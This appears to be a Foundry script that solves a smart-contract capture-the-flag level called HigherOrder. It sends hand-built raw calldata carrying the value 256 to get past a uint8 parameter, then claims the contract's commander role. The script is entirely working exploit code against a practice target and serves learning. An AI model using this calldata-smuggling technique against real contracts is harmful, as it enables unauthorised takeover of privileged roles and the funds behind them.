// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import {HigherOrder} from "../src/30_HigherOrder.sol";
import {Script, console} from "forge-std/Script.sol";

contract HigherOrderSolve is Script {
    HigherOrder order = HigherOrder(0xB048673E4054D7C4dD3f5f06a79524e8714148c0);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes memory data = hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100";
        console.log("Commander After#", order.commander());
        address(order).call(data);
        order.claimLeadership();
        console.log("Commander After#", order.commander());
        vm.stopBroadcast();
    }
}
